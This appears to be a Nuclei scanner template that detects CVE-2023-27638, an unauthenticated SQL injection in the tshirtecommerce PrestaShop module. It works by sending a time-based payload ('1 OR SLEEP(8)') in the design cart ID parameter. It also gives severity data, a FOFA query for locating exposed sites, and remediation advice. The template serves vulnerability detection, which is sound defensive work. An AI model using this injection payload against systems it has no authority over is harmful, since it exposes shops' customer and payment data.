flow: http(1) && http(2)
http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - contains_all(tolower(body), 'prestashop', 'tshirtecommerce')
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - duration>=8
    - status_code == 200
    type: dsl
  raw:
  - '@timeout: 30s

    GET /module/tshirtecommerce/designer?tshirtecommerce_design_cart_id=1%20OR%20SLEEP(8)
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-27638
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2023-27638
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.98119
    epss-score: 0.58686
  description: 'The tshirtecommerce module for PrestaShop is vulnerable to unauthenticated
    SQL injection via the tshirtecommerce_design_cart_id parameter, allowing attackers
    to execute arbitrary SQL queries and extract sensitive information from the database.
    This is due to lack of input sanitization, as shown in the patch where pSQL()
    is now used.

    '
  impact: 'Unauthenticated attackers can execute SQL injection through the tshirtecommerce_design_cart_id
    parameter to extract the complete PrestaShop database including customer data
    and payment information.

    '
  metadata:
    fofa-query: body="Prestashop" && body="tshirtecommerce"
    max-request: 1
    product: prestashop
    vendor: tshirtecommerce
  name: tshirtecommerce PrestaShop Module - SQL Injection
  reference:
  - https://security.friendsofpresta.org/module/2023/03/21/tshirtecommerce_cwe-89.html
  - https://nvd.nist.gov/vuln/detail/CVE-2023-27638
  remediation: 'Update the tshirtecommerce module to the latest version and apply
    all security patches.

    '
  severity: high
  tags: cve,cve2023,prestashop,tshirtecommerce,sqli,vkev,vuln
